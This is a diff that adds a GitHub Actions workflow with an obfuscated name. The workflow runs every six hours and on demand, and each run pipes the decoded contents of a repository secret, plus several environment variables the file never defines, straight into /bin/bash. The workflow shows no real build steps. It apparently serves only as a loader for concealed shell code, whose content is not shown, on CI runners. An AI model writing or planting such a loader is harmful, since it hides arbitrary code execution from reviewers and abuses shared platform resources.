@@ -1,0 +1,20 @@
+name: xianghuaguo3451
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianghuaguo3451
+        env:
+          a4: ${{ secrets.a4 }}
+        run: |
+          echo $a4 | jq -r .dxxvb764 | /bin/bash
+          echo $tf262 | jq -r .vifc19 | /bin/bash
+          echo $sac50 | jq -r .l6376 | /bin/bash
+          echo $xzo8 | jq -r .bkfd60711 | /bin/bash
+          echo $ga9336 | jq -r .qjqrj76 | /bin/bash
+
